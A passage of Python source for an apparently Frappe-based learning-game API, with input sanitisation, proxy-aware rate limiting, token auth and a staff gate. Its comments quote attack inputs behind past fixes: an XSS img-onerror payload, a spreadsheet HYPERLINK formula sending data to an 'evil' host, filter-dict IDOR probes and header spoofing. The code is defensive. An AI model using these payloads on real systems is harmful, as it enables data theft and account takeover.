"""
Hikmat public API — the bridge between the game (student UI) and Frappe.

The game fetches get_courses()/get_structure()/get_settings() instead of using a
hardcoded COURSES array, and posts submit_attempt() when a lesson activity ends.
Output of get_courses() matches the game's COURSES shape 1:1.

Performance: the read endpoints are cached in Redis (content rarely changes) and
busted on any content edit via doc_events (see hooks.py) — this turns the old
~hundreds-of-queries-per-boot into one cheap cache hit. See clear_content_cache().

Abuse: writes (submit_attempt, signup_student) and login (login_student) are
rate-limited / locked-out via Redis counters. These endpoints are allow_guest, so
treat every input as untrusted: validate the student and clamp all numbers.
"""
import hashlib
import hmac
import ipaddress
import json
import re
import secrets
import time
import unicodedata

import frappe
from frappe import _
from werkzeug.security import check_password_hash, generate_password_hash

# ---------------------------------------------------------------------------
# Caching (content is read far more than it changes)
# ---------------------------------------------------------------------------
COURSES_CACHE_KEY = "hikmat:courses"
STRUCTURE_CACHE_KEY = "hikmat:structure"
SETTINGS_CACHE_KEY = "hikmat:settings"


_CACHE_TTL = 3600  # busted immediately on content edit via doc_events; TTL is a safety net


def _cached(key, builder):
    val = frappe.cache().get_value(key)
    if val is None:                      # cache miss (an empty list/dict is cached as-is)
        val = builder()
        frappe.cache().set_value(key, val, expires_in_sec=_CACHE_TTL)
    return val


def clear_content_cache(doc=None, method=None):
    """Bust the read caches. Wired to content doctype on_update/on_trash in hooks.py,
    and called by setup_data.seed_content(). The (doc, method) args let it be a doc event."""
    c = frappe.cache()
    for k in (COURSES_CACHE_KEY, STRUCTURE_CACHE_KEY, SETTINGS_CACHE_KEY):
        c.delete_value(k)


# ---------------------------------------------------------------------------
# Small helpers
# ---------------------------------------------------------------------------
def _int(v, default=0):
    try:
        return int(v)
    except (TypeError, ValueError):
        return default


def _docname(val, maxlen=140):
    """Coerce a caller-supplied DOCUMENT NAME to a scalar string; return "" for anything
    that isn't one.

    Frappe's whitelist layer hands parameters through as parsed JSON, so a "name" argument
    can arrive as a dict or a list — and frappe.db.get_value(doctype, {...}) treats a dict as
    a FILTER. Proven on the since-removed Boli audio endpoint, where clip={"status":
    "in_verification"} made it select and stream a document the caller never named — a real
    IDOR, and the reason every _docname sink still coerces. Non-strings are REJECTED rather
    than str()-ed, so a probe fails
    as not_found instead of quietly resolving to "{'status': 'in_verification'}"-shaped junk.
    Length is capped because a document name cannot exceed the Link column width anyway."""
    if val is None or isinstance(val, (bool, dict, list, tuple, set, bytes, bytearray)):
        return ""
    if isinstance(val, (int, float)):            # a numeric autoname arrives as a JSON number
        val = str(val)
    if not isinstance(val, str):
        return ""
    return val.strip()[:maxlen]


# A COMPLETE tag only: the closing ">" is REQUIRED, and that is a data-integrity control.
# With it optional ("<[^>]*>?") the greedy [^>]* swallowed everything after an UNPAIRED "<"
# to the end of the string, so an ordinary Bhojpuri sentence containing a comparison lost
# its whole tail with no marker: 'और 1 < 5 क्‍ष दिन‍' came back as 'और 1' — 17 characters and
# two ZWJ conjuncts silently deleted from what a girl actually wrote. A lone
# "<" is not a tag; it is a character she typed, and only the character is dropped (by the
# unconditional replace() in _plain_text, which is what actually guarantees the result is
# untaggable — this regex only strips tag BODIES so attributes don't survive as text).
_TAG_RE = re.compile(r"<[^>]*>")

# Format (Cf) characters that MUST survive ingest — an ALLOWLIST, deliberately tiny.
#
# U+200C ZWNJ and U+200D ZWJ are not decoration in Devanagari: they pick the half-form vs
# the conjunct — "क्" + ZWJ + "ष" is spelled differently from the plain conjunct "क्ष" — and they
# finalise a word ("दिन" + ZWJ). They are part of how Hindi and Bhojpuri are actually
# written. str.isprintable() is False for every Cf character, so the old filter silently
# deleted them: in an app that stores and replays a girl's own Devanagari back to her, that
# is data corruption, not hygiene. (It also broke ZWJ-compound emoji — the family/profession
# sequences — which is what an avatar can be.)
#
# Everything else invisible stays OUT, on purpose:
#   U+FEFF ZWNBSP/BOM       — an encoding artefact, never spelling; pads a value invisibly
#   U+00AD SOFT HYPHEN      — a line-break hint, never part of a word
#   U+200E/200F, U+202A-202E — bidi marks/overrides: Devanagari is LTR and needs none, and
#                             an override can visually reorder a facilitator's grid row
#   U+2060 word joiner etc. — no orthographic role in this corpus
# Adding to this tuple means arguing for one specific character; do not widen it to "all Cf".
# Written as escapes on purpose — these characters are INVISIBLE in a source file.
_KEEP_FORMAT = ("\u200c", "\u200d")             # ZWNJ, ZWJ


def _plain_text(val):
    """Plain-text-ify student free text at ingest: markup out, every letter kept
    (Devanagari, spaces, apostrophes, hyphens all survive).

    Deliberately NOT html-escaped. These same strings are replayed to the girl in
    the game, which escapes on render — storing "&lt;img" would show her the entity
    text. Escaping belongs at the output sink — any report whose grid assigns cell
    HTML directly has to escape there. Dropping every leftover angle
    bracket is what makes the result untaggable, even from a payload crafted to
    survive the tag regex — that property must hold whatever else changes here.

    Accepts any type (a whitelisted argument can arrive as a dict/list), so it doubles
    as the coercion for free-text fields."""
    s = _TAG_RE.sub(" ", str(val or "")).replace("<", "").replace(">", "")
    s = " ".join(s.split())                      # newlines/tabs → single spaces
    # Controls out, the two Indic joiners back in (see _KEEP_FORMAT for why).
    return "".join(ch for ch in s if ch.isprintable() or ch in _KEEP_FORMAT)


def _content_key(val, maxlen=140):
    """A client-supplied CONTENT key (track / lesson / activity / tool / lang …) → a scalar,
    markup-free, formula-inert, length-clamped string.

    These arrive from the game as content ids, but nothing stops a caller sending anything at
    all, and they are DENORMALISED onto Lesson Attempt / Lesson Doubt / Learning Event — the
    very rows the facilitator reports render. Proven on 2026-07-28: submit_attempt stored
    track='<img src=x onerror=…>' verbatim and it EXECUTED in a System Manager's Desk grid via
    the real report path. Note frappe pre-sanitizes form_dict for GUESTS only
    (frappe/__init__.py), and a JSON-quoted payload slips past its bleach layer anyway — so an
    authenticated learner's write has NO framework guard. This is the app's own guard; every
    persisted content key goes through it.

    Order matters: _docname first (a dict/list becomes "" instead of str()-ed junk that would
    then be stored — see _docname), then _plain_text, then the formula-lead strip, then the
    clamp. The clamp is not cosmetic either: a Data column is varchar(140) and frappe raises
    on an overlong value, so an unclamped field is also a 500."""
    return _no_formula_lead(_plain_text(_docname(val, maxlen)))[:maxlen]


# An IDENTIFIER-shaped field may not OPEN with a spreadsheet formula lead. Excel /
# LibreOffice / Sheets evaluate a cell that starts with one of these, and a leading TAB/CR
# can shift the rest of the value into a cell that then leads with "=". Proven: a plain
# guest self-registered '=HYPERLINK("http://evil/?"&A1,"HI")' and it became a LIVE formula
# cell in the Attendance Summary XLSX a facilitator exported.
#
# report_utils.formula_guard neutralises this at the OUTPUT sink (which is also what renders
# rows stored BEFORE this fix inert); this is the INGEST half. Both halves are load-bearing,
# and the ingest half is the only DURABLE one: two export paths never reach a report's
# execute() at all — frappe's prepared-report automation and the Desk list/report-view export
# (frappe.desk.reportview.export_query) — so a guard that lives only in our report code is
# bypassable through machinery we do not control. Refusing the payload at ingest is not.
#
# ==> WHAT THIS MUST NEVER BE APPLIED TO <==
# A girl's own PROSE — a doubt question, an email she composed, a sentence she typed — is
# never touched, even if it opens with "=" or "-". Rewriting her words to make a spreadsheet
# happy would corrupt what she actually wrote, and "- बाजार में"
# or "=5" is a legitimate thing to write. Prose stays protected by the OUTPUT guard, which
# is lossless (it prefixes a cell, it does not edit the stored value). The distinction is
# exactly: identifier-shaped (a name, a lesson key, a device id, a category slug) → strip
# the lead here; anything she composed → leave it alone.
_NAME_FORMULA_LEAD = "=+-@\t\r\n"


def _no_formula_lead(s):
    """Drop leading formula characters (and the whitespace they hide behind) from an
    IDENTIFIER-shaped value. Only the LEAD is touched — everything after the first real
    character survives byte-for-byte, so "life-skills", "x=y" and "गुड़िया देवी" are
    unchanged. Read the note above before reusing this on anything a learner composed."""
    while s and s[0] in _NAME_FORMULA_LEAD:
        s = s[1:].lstrip()
    return s


def _display_name(val, maxlen=40):
    """Normalise a SELF-REGISTERED display name (signup_student / signup_online).

    Neutralise rather than reject: the game surfaces one generic "could not sign up" message
    for every signup error, so a refusal would leave a girl retyping the same name forever
    with nothing to correct. A human name never starts with = + - @ (or a tab/CR), so
    stripping that lead loses nothing real; a name made of NOTHING else comes back too short
    and the caller's own 2–40 length check answers bad_name.

    Only the LEAD is touched. Letters, spaces, apostrophes and hyphens inside the name, and
    Devanagari (including ZWJ/ZWNJ conjuncts), survive byte-for-byte — "D'Souza Rani-Kumari"
    and "गुड़िया देवी" must be stored exactly as she typed them."""
    return _no_formula_lead(_plain_text(val)[:maxlen])


# ---------------------------------------------------------------------------
# Abuse ceilings — per-IP / per-student rate limits.
#
# Two things have to be right for a rate limit to mean anything: the KEY must be
# something the caller cannot choose (see _client_ip), and the WINDOW must actually
# close (see _rate_ok). Both were wrong before; see the notes on each.
# ---------------------------------------------------------------------------
_RL_PREFIX = "hikmat:rl2:"          # rl2: the rl: keys held pickled values; INCR can't touch those

# WHICH DIRECT PEERS may speak for someone else through X-Forwarded-For.
#
# X-Forwarded-For is only evidence when the socket peer is a proxy of OURS: nginx APPENDS
# the peer it saw ($proxy_add_x_forwarded_for), so the entries our own proxies wrote are
# trustworthy and everything further left is text the client chose. If the peer is not one
# of ours, the entire header is client input and is IGNORED — the correct, unspoofable
# answer for a directly exposed `bench serve` or a mapped container port.
#
# This replaced a hop COUNT (`hikmat_trusted_proxy_hops`, default 1), which was wrong in
# both directions and UNDETECTABLY so:
#   * one hop too high → we read attacker-written text, so every per-IP ceiling AND the
#     PIN lockout were spoofable (proven over HTTP: 20 wrong PINs on one account from 20
#     spoofed headers never tripped the 8-try lockout);
#   * one hop too low  → we key on our own proxy, so every client on the site collapses
#     into ONE bucket, and with the fail-closed signup/AI ceilings that is a
#     site-wide lockout.
# Nothing inside the app could tell those apart, and production having one hop more than
# configured is entirely plausible (a managed host fronts sites with its own layer). Trust
# is now a property of the ADDRESS, which needs no per-deployment number: the default is
# already correct for direct exposure AND for nginx-on-localhost.
#
# Default = loopback + RFC1918 + link-local + unique-local, i.e. exactly where a reverse
# proxy of ours can sit. A PUBLIC address is never trusted by default, so a CDN or an
# external load balancer must be named explicitly:
#     "hikmat_trusted_proxies": ["203.0.113.0/24", "2001:db8::/32"]
# An EMPTY list means "trust nobody" — ignore X-Forwarded-For entirely (what the dev
# bench sets, since localhost is otherwise a trusted peer and the header would be
# spoofable from a shell on the same machine).
_DEFAULT_TRUSTED_PROXIES = (
    "127.0.0.0/8", "::1/128",                            # loopback — nginx on this host
    "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16",     # RFC1918 — proxy on the LAN/bridge
    "169.254.0.0/16", "fe80::/10",                        # link-local
    "fc00::/7",                                           # IPv6 unique-local (containers)
)

_TRUSTED_NETS_CACHE = {}     # parsed CIDRs, keyed by the raw config value (parse once)


def _conf_warn(tag, msg, *args):
    """Log a CONFIGURATION problem once per request per `tag`.

    A misconfigured proxy model is dangerous precisely because it is SILENT — both wrong
    directions look identical from outside the app. Everything that can only be diagnosed
    from inside says so here, naming the config key. Once per tag per request, so a
    permanent misconfiguration cannot turn every request into a log write (and the file
    rotates: frappe's logger keeps 20 × 100 KB).

    Logged at ERROR on purpose, and not because it is fatal. frappe's own default is
    `logging.WARNING if frappe._dev_server else logging.ERROR` (frappe/utils/logger.py), so
    a .warning() call is DISCARDED on every real deployment — verified on this bench: the
    first version of this function logged nothing at all to logs/hikmat.log. A warning that
    only appears on a developer's laptop is the same silence this exists to remove."""
    try:
        seen = getattr(frappe.local, "_hikmat_conf_warned", None)
        if seen is None:
            seen = set()
            frappe.local._hikmat_conf_warned = seen
        if tag in seen:
            return
        seen.add(tag)
        frappe.logger("hikmat").error(msg, *args)
    except Exception:
        pass


def _trusted_proxies():
    """The trusted-proxy networks: site_config `hikmat_trusted_proxies` (a list of IPs or
    CIDRs, or a comma/space-separated string; an empty list = trust nobody) else
    _DEFAULT_TRUSTED_PROXIES. Parsed once per distinct config value — this runs on every
    rate-limited request."""
    conf = getattr(frappe, "conf", None) or {}
    if "hikmat_trusted_proxy_hops" in conf:
        _conf_warn("hops", "hikmat: `hikmat_trusted_proxy_hops` is OBSOLETE and ignored — "
                           "the client IP now comes from the trusted-proxy model. Replace it "
                           "with `hikmat_trusted_proxies` (list of IPs/CIDRs) in site_config.json.")
    raw = conf.get("hikmat_trusted_proxies", None)
    if raw is None:
        raw = _DEFAULT_TRUSTED_PROXIES
    if isinstance(raw, str):
        raw = [p for p in re.split(r"[,;\s]+", raw) if p]
    if not isinstance(raw, (list, tuple)):
        _conf_warn("trusted-type", "hikmat: `hikmat_trusted_proxies` must be a list of "
                                   "IPs/CIDRs (got %r) — treating it as EMPTY, so "
                                   "X-Forwarded-For is ignored.", raw)
        raw = ()
    ck = tuple(str(x) for x in raw)
    cached = _TRUSTED_NETS_CACHE.get(ck)
    if cached is None:
        nets, bad = [], []
        for item in ck:
            try:
                nets.append(ipaddress.ip_network(item.strip(), strict=False))
            except ValueError:
                bad.append(item)               # a typo'd CIDR must not silently widen/narrow trust
        cached = (tuple(nets), tuple(bad))
        _TRUSTED_NETS_CACHE[ck] = cached
    nets, bad = cached
    if bad:                                    # warned per REQUEST, not per parse: a config
        _conf_warn("trusted-bad",              # error must stay visible after the cache warms
                   "hikmat: `hikmat_trusted_proxies` entries are not IPs/CIDRs and were "
                   "ignored: %s", ", ".join(repr(b) for b in bad))
    return nets


def _is_trusted_proxy(ip, nets):
    """True when the normalised address `ip` is inside one of `nets`. A v4-vs-v6 mismatch
    is simply False (ipaddress defines containment across versions as false), so mixing
    families in the config is safe."""
    if not ip:
        return False
    try:
        addr = ipaddress.ip_address(ip)
    except ValueError:
        return False
    return any(addr in n for n in nets)


def _norm_ip(val):
    """One X-Forwarded-For / peer token → a canonical bare IP, or "" if it isn't one.

    Strips [brackets] and a trailing :port, and canonicalises the address so the same
    host cannot be re-spelled into a second bucket: 2001:DB8::0:1 and 2001:db8::1 are
    one key, and an IPv4-MAPPED IPv6 address is folded onto its IPv4 form
    (::ffff:1.2.3.4 → 1.2.3.4). That last fold is done explicitly here because
    ipaddress does NOT do it — str(ip_address('::ffff:1.2.3.4')) is still
    '::ffff:1.2.3.4' (this comment used to claim otherwise). It matters twice over:
    two spellings of one host would otherwise be two rate-limit buckets, and
    _is_trusted_proxy above would not recognise ::ffff:127.0.0.1 as loopback.

    Anything that isn't an IP at all ("unknown", a hostname, junk) comes back empty so
    the caller falls through to a trustworthy source."""
    s = str(val or "").strip()
    if not s:
        return ""
    if s.startswith("["):                      # [2001:db8::1]:443  →  2001:db8::1
        s = s[1:].split("]", 1)[0]
    elif s.count(":") == 1:                    # 1.2.3.4:5678 — one colon is a port;
        s = s.split(":", 1)[0]                 # a bare IPv6 address always has two or more
    try:
        ip = ipaddress.ip_address(s)
    except ValueError:
        return ""
    mapped = getattr(ip, "ipv4_mapped", None)  # IPv6Address only; None for a real v6 host
    return str(mapped or ip)


def _client_ip():
    """The caller's IP — the key every rate limit and the PIN lockout's per-source counter
    hang on, so it must be something the caller CANNOT choose.

    Deliberately NOT frappe.local.request_ip: Frappe takes the FIRST X-Forwarded-For token,
    which is 100% client-supplied, so a flood mints a fresh bucket per request just by
    varying the header (proven: 5 spoofed values → 5 independent buckets → every per-IP
    ceiling in the app bypassable, including pre-auth signup).

    The model (see _DEFAULT_TRUSTED_PROXIES for why it is not a hop count):
      1. the socket peer (request.remote_addr) is the only address nobody can forge;
      2. if that peer is NOT a trusted proxy, X-Forwarded-For is pure client input → ignore
         the header completely and key on the peer. Correct for direct exposure;
      3. if it IS a trusted proxy, walk the header RIGHT-TO-LEFT (nginx appends), skipping
         addresses that are themselves trusted proxies of ours, and take the first
         untrusted entry: that is the address our outermost proxy actually saw. Anything
         left of it is text the client wrote and is never read;
      4. no header, an unreadable entry where our proxy should have written a real address,
         or a chain that is trusted all the way down → fall back to the peer, and LOG it
         (step 4 means one shared bucket for every client, which is exactly the failure an
         operator must be able to see).

    Returns a canonical bare IP string, or "unknown" when there is no request at all
    (background job, scheduler, `bench execute`)."""
    req = getattr(frappe.local, "request", None)
    peer = _norm_ip(getattr(req, "remote_addr", None) if req is not None else None)
    if req is None:
        return peer or "unknown"
    nets = _trusted_proxies()
    if not _is_trusted_proxy(peer, nets):
        return peer or "unknown"               # direct exposure: the header is not evidence
    headers = getattr(req, "headers", None)
    raw = ""
    if headers is not None:
        # Several X-Forwarded-For headers are ONE chain (RFC 7230 §3.2.2); WSGI usually
        # joins them already, but .get() would return only the first — so join explicitly.
        vals = None
        try:
            vals = headers.get_all("X-Forwarded-For")
        except (AttributeError, TypeError):
            vals = None
        raw = ", ".join(v for v in (vals or []) if v) or (headers.get("X-Forwarded-For") or "")
    parts = [p for p in (t.strip() for t in raw.split(",")) if p]   # blank entries dropped
    unusable = None
    for tok in reversed(parts):
        ip = _norm_ip(tok)
        if not ip:                             # our proxy writes real addresses; junk here
            unusable = tok                     # means the trust assumption is broken →
            break                              # stop rather than keep reading leftwards
        if _is_trusted_proxy(ip, nets):
            continue                           # another proxy of ours — keep walking left
        return ip                              # ← the client, as our own proxy saw it
    # Warn whether or not the header had usable entries. A trusted peer that sends NO
    # X-Forwarded-For at all (a container with a mapped port, or a proxy that only sets
    # X-Real-IP) collapses every client onto the peer address exactly as a
    # trusted-all-the-way-down chain does — and that case used to be skipped by an
    # `if parts:` guard, so the single most dangerous misconfiguration was the one that
    # logged nothing. Fail loudly: fail-closed ceilings now hang on this value.
    _conf_warn("xff-no-client",
               "hikmat: X-Forwarded-For %r from trusted peer %s yielded no client "
               "address (%s), so rate limits and the login lockout are keyed on the "
               "PROXY — every client shares one bucket. Check `hikmat_trusted_proxies` "
               "in site_config.json.", raw, peer,
               "unreadable entry %r" % (unusable,) if unusable
               else ("no X-Forwarded-For header" if not parts else "every entry is trusted"))
    return peer or "unknown"


@frappe.whitelist()   # STAFF-ONLY — enforced by _require_staff(), not by the decorator
def whoami_ip():
    """What this request's client IP resolves to, and why. The ONE thing an operator cannot
    otherwise check from outside: a wrong proxy model is invisible (both failure directions
    look identical from a browser), so verifying the real production topology needs a view
    from inside. Open this from a device whose public IP you know: `client_ip` must equal it.
    If it comes back as your proxy's address instead, add that proxy's range to
    `hikmat_trusted_proxies`; if it echoes something you can set yourself, the peer is being
    trusted when it should not be (set the list to []).

    Staff only, and it discloses nothing the caller did not send about itself."""
    _require_staff()
    req = getattr(frappe.local, "request", None)
    headers = getattr(req, "headers", None) if req is not None else None
    return {
        "client_ip": _client_ip(),                       # what every limiter/lockout keys on
        "socket_peer": _norm_ip(getattr(req, "remote_addr", None) if req is not None else None),
        "x_forwarded_for": (headers.get("X-Forwarded-For") if headers is not None else None) or "",
        "peer_is_trusted_proxy": _is_trusted_proxy(
            _norm_ip(getattr(req, "remote_addr", None) if req is not None else None),
            _trusted_proxies()),
        "trusted_proxies": [str(n) for n in _trusted_proxies()],
        "configured": "hikmat_trusted_proxies" in (getattr(frappe, "conf", None) or {}),
    }


def _rl_cache():
    """The Redis handle the limiters use. Its own accessor so an outage can be simulated
    (tests, ops drills) at exactly the seam that matters, without knocking out the cache
    the rest of the request needs."""
    return frappe.cache()


def _rl_warn(bucket, exc, denied):
    """Log an unavailable limiter ONCE per request (an outage must not itself become a
    write storm in the Error Log)."""
    try:
        if getattr(frappe.local, "_hikmat_rl_warned", False):
            return
        frappe.local._hikmat_rl_warned = True
        # .error(), NOT .warning(): frappe's default log level is WARNING only on a dev
        # server and ERROR everywhere else (utils/logger.py), so a .warning() here would be
        # discarded in production — and this is the ONE new failure mode of the limiter
        # rewrite (signup and the AI endpoints refused because the cache is down). An outage
        # that leaves no evidence is indistinguishable from a spoofing attack.
        frappe.logger("hikmat").error(
            "rate limiter unavailable (%s: %s) — bucket %r %s",
            type(exc).__name__, exc, bucket, "DENIED (fail-closed)" if denied else "ALLOWED (fail-open)")
    except Exception:
        pass


def _rate_ok(bucket, limit, seconds, fail_closed=False):
    """True if `bucket` is still under `limit` inside a FIXED window of `seconds`.

    FIXED, not sliding: the TTL is armed once, when the counter is created, and is never
    refreshed by a later hit, so the window really closes. (The old code re-set the TTL on
    every hit and documented that as intentional — it isn't: a client hitting faster than
    the TTL kept its window, and therefore its own block, alive forever. On a shared
    classroom IP that turns an abuse ceiling into a self-inflicted outage.) INCR is atomic,
    so concurrent laptops can't race past the ceiling either.

    Availability tradeoff — this app runs a rural classroom on flaky 2G, and a cache hiccup
    must never stop a child learning:
      * fail_closed=False (default) → an unavailable limiter ALLOWS the call. Used for the
        cheap, already-authenticated game writes (attempts, module tests, doubts, events,
        attendance). Losing an abuse ceiling for the length of a Redis outage is far less
        harmful than a room of girls unable to save their work.
      * fail_closed=True → an unavailable limiter DENIES the call. Reserved for the paths
        where an uncapped flood is genuinely destructive: signup (pre-auth, mints Student
        rows + 90-day tokens) and the AI endpoints (an open-ended LLM must never run
        uncapped). Lessons keep working while those are refused, and the client's outbox
        treats `rate_limited` as transient, so a refused write is retried when the limiter
        returns rather than lost.
    Either way the outage is logged (see _rl_warn) so it is visible rather than silent.

    NOTE the numeric ceilings at the call sites are deliberately generous: a whole
    classroom shares one public IP, so tightening them would lock out honest cohorts."""
    try:
        c = _rl_cache()
        key = c.make_key(_RL_PREFIX + bucket)
        n = c.incr(key)                        # creates the counter at 1 when absent
        if n <= 1:                             # brand-new counter → start the window ONCE.
            c.expire(key, seconds)             # never re-armed below: the window closes.
        return n <= limit
    except Exception as e:
        _rl_warn(bucket, e, fail_closed)
        return not fail_closed


def _rate_state(bucket):
    """(count, ttl_seconds) for a live bucket; ttl is -2 when the key is gone, -1 when it
    has no expiry. Introspection for tests and for ops checking a blocked classroom — the
    counters are plain INCR integers, not pickled cache values, so read them raw."""
    c = _rl_cache()
    key = c.make_key(_RL_PREFIX + bucket)
    raw = c.get(key)
    if isinstance(raw, bytes):
        raw = raw.decode()
    return _int(raw, 0), _int(c.ttl(key), -2)


def _rate_reset(bucket):
    """Drop one bucket. Used by tests, and by hand when ops needs to unblock a classroom."""
    c = _rl_cache()
    c.delete(c.make_key(_RL_PREFIX + bucket))


# ---------------------------------------------------------------------------
# Auth helpers — PIN hashing (with legacy-plaintext upgrade) + per-student tokens
# ---------------------------------------------------------------------------
def _hash_pin(pin):
    return generate_password_hash(str(pin), method="pbkdf2:sha256") if pin else ""


def _looks_hashed(stored):
    return str(stored or "").startswith(("pbkdf2:", "scrypt:"))


def _pin_ok(stored, pin):
    """Verify a PIN, FAIL-CLOSED. A profile with no PIN cannot be authenticated — this
    closes the shared-laptop hole where a PIN-less profile opened with zero auth. Hashed
    values use a constant-time hash check; legacy plaintext (pre-hashing) still verifies
    so existing logins keep working until upgraded on next successful login."""
    if not stored or not pin:
        return False                      # no PIN set (or none supplied) → cannot authenticate
    if _looks_hashed(stored):
        return check_password_hash(str(stored), str(pin))
    return hmac.compare_digest(str(stored), str(pin))         # legacy plaintext


_TOKEN_TTL_DAYS = 90


def _token_valid(issued_on):
    """A token is live for _TOKEN_TTL_DAYS since it was last issued/refreshed."""
    if not issued_on:
        return False
    return frappe.utils.time_diff_in_seconds(frappe.utils.now(), issued_on) <= _TOKEN_TTL_DAYS * 86400


def _token_for(student_name):
    """Return a live token for the student, called on every successful login/signup.
    Sliding-window expiry: a still-valid token keeps its VALUE (so a girl stays logged in
    across the shared laptops she's used) but its issued-on slides forward, so an actively
    used account never expires. A missing or expired token is rotated to a fresh value.

    ONE STUDENT, ALWAYS — the coercion + existence check below is a security control, not
    tidiness. frappe.db.set_value(dt, {...}, ...) is an ORM FILTER (that is exactly how
    _safe_delete takes a filter dict), so a non-scalar reaching here turns this into a
    BULK UPDATE. Proven on 2026-07-28: login_student passed its caller-supplied `student`
    straight through, and login_student({"student_name": ["like", "R2GATE%"]}, "1234")
    rotated TWO girls' auth_token to ONE shared value and handed it back — i.e. one token
    that _token_ok accepts for every matched child (cross-account takeover), plus every
    matched campus laptop logged out. Callers coerce too; this is the sink, so it also
    refuses, and a caller that names nobody gets a fresh throw-away token instead of an
    UPDATE with no WHERE."""
    student_name = _docname(student_name)
    if not student_name or not frappe.db.exists("Student", student_name):
        return frappe.generate_hash(length=40)               # never persisted → authenticates nobody
    row = frappe.db.get_value("Student", student_name, ["auth_token", "token_issued_on"], as_dict=True)
    tok = row.auth_token if row else None
    if not tok or not _token_valid(row.token_issued_on):
        tok = frappe.generate_hash(length=40)                # mint / rotate
    frappe.db.set_value("Student", student_name,
                        {"auth_token": tok, "token_issued_on": frappe.utils.now()},
                        update_modified=False)
    return tok


def _token_ok(student_name, token):
    """Validate a bearer token, FAIL-CLOSED: a student who is DEACTIVATED, has no token, an
    expired token, or a mismatch is rejected. (Legacy token-less students simply re-login,
    which mints one.)

    `active` is checked here, in the same single row read, because deactivating a girl is the
    facilitator's normal offboarding lever and it has to cut off her DEVICE, not just future
    logins. It used to be checked by a single endpoint, so a deactivated student's cached
    token still worked everywhere else for up to _TOKEN_TTL_DAYS (90) unless someone
    separately called revoke_student_token. Putting it in the shared auth path means every
    endpoint inherits it, including the ai_* ones that call _token_ok directly."""
    row = frappe.db.get_value("Student", _docname(student_name),
                              ["auth_token", "token_issued_on", "active"], as_dict=True)
    if not row or not row.active or not row.auth_token or not _token_valid(row.token_issued_on):
        return False
    return hmac.compare_digest(str(row.auth_token), str(token or ""))


# -- Dual auth: the game has two kinds of learner ------------------------------
# CAMPUS (offline-capable) students are custom Student docs authed by a per-student
# bearer token (_token_ok). ONLINE students are Frappe Website Users, so their request
# already carries a logged-in session — the linked Student is found via Student.user.
# A request is authorized for a student if EITHER proof holds.
def _session_student():
    """The Student linked to the currently logged-in (online) Website User, if any.
    The active=1 filter is load-bearing, not cosmetic: it is what stops a deactivated
    ONLINE learner's live Frappe session from still resolving to her Student (the session
    twin of the deactivated-token hole closed in _token_ok)."""
    u = getattr(frappe.session, "user", None)
    if u and u != "Guest":
        return frappe.db.get_value("Student", {"user": u, "active": 1}, "name")
    return None


def _authorized(student, token):
    """True if the caller may act as `student`: a matching campus token, OR an online
    session whose linked Student is exactly this one. Both proofs require the student to be
    ACTIVE (see _token_ok / _session_student), so every endpoint that gates on _authorized
    inherits the deactivation cut-off and answers `auth` — which the game treats as
    "re-login", the right outcome for a device that has been switched off.

    `student` is coerced to a scalar string first: Frappe's whitelist layer passes through
    whatever JSON the client sent, and a dict here would reach frappe.db.get_value as a
    FILTER and match some arbitrary student. Rejecting non-strings in the shared auth path
    keeps that primitive out of every endpoint behind it."""
    student = _docname(student)
    if student and _token_ok(student, token):
        return True
    ss = _session_student()
    return bool(student and ss and ss == student)


# ---------------------------------------------------------------------------
# STAFF GATE — read this before "simplifying" any call to _require_staff().
#
# `@frappe.whitelist()` (no allow_guest) is NOT an authorization check. It refuses
# exactly one user: Guest. And in THIS app every online learner is a real Frappe
# Website User (see _create_online_user), so a bare whitelist admits every child in
# the programme. That is not theory: on 2026-07-28 an ordinary online learner
# (roles []) was able to POST delete_student and permanently erase another girl's
# entire record, and revoke_student_token to log her out of her own device. The
# comments on those two functions claimed "requires a logged-in Desk user" — the
# decorator never did that. Guests were refused, which is why it went unnoticed.
#
# Staff == System Manager. This project has no dedicated facilitator Role: a
# facilitator IS a Desk user with System Manager. That is the definition used by
# _facilitator_users() below (who gets the "I'm stuck" bell) and by every report,
# query-report and number card in setup_data.py (roles=[{"role": "System Manager"}]).
# Defining it once, here, means
# introducing a narrower "Hikmat Facilitator" role later is a one-line change in one
# place instead of a hunt through the file.
#
# Fails CLOSED, always: Guest, Website User (i.e. any learner), a Desk user without
# the role, and a session whose roles cannot even be read are all refused. The refusal
# is a PermissionError (HTTP 403), never a soft {"ok": False} — a soft return is
# indistinguishable from "no such student" and would let a prober map the roster.
# ---------------------------------------------------------------------------
_STAFF_ROLE = "System Manager"


def _is_staff():
    """True only for a logged-in session that holds _STAFF_ROLE."""
    user = getattr(frappe.session, "user", None)
    if not user or user == "Guest":
        return False
    try:
        return _STAFF_ROLE in (frappe.get_roles() or [])
    except Exception:                     # unreadable roles are not a grant
        return False


def _require_staff():
    """The one gate for staff-only endpoints — grep for it. Any whitelisted function in
    this file that DELETES, REVOKES, writes to a learner's row on someone else's behalf,
    exports data, or reads roster-wide PII must call this as its FIRST statement (before
    any existence check, so the error can't be used as an oracle)."""
    if not _is_staff():
        frappe.throw(_("Not permitted"), frappe.PermissionError)


# ---------------------------------------------------------------------------
# Facilitator notifications — surface a learner's "I'm stuck" tap (and, later,
# doubts and help requests) to every facilitator's Desk bell. Best-effort: a
# notification failure must never block the child's action.
# ---------------------------------------------------------------------------
def _facilitator_users():
    """Enabled Desk users who facilitate — currently the System Managers, minus system
    accounts. (A dedicated 'Facilitator' role can be added here later — see _STAFF_ROLE,
    the single definition of "staff" this reads from.)"""
    users = frappe.get_all("Has Role", filters={"role": _STAFF_ROLE, "parenttype": "User"},
                           pluck="parent")
    return [u for u in set(users)
            if u not in ("Administrator", "Guest") and frappe.db.get_value("User", u, "enabled")]


def _notify_facilitators(subject, doctype=None, docname=None):
    """Drop a Desk Notification Log (bell alert) for every facilitator."""
    try:
        for u in _facilitator_users():
            frappe.get_doc({
                "doctype": "Notification Log", "for_user": u, "type": "Alert",
                # The subject is server-composed but interpolates a learner's name and her typed
                # question, and the Desk bell renders it. Callers sanitise their inputs; this is
                # the sink's own guard, so a row stored BEFORE that fix still can't fire here.
                "subject": _plain_text(subject)[:140],
                "document_type": doctype or "", "document_name": docname or "",
            }).insert(ignore_permissions=True)
        frappe.db.commit()
    except Exception:
        frappe.db.rollback()   # doubt was already committed; only the notifications roll back


# ---------------------------------------------------------------------------
# Public read endpoints (cached)
# ---------------------------------------------------------------------------
@frappe.whitelist(allow_guest=True)
def get_courses():
    """Return the full curriculum as the game's COURSES array (cached)."""
    return _cached(COURSES_CACHE_KEY, _build_courses)


def _build_courses():
    out = []
    published = frappe.get_all(
        "Track", filters={"published": 1},
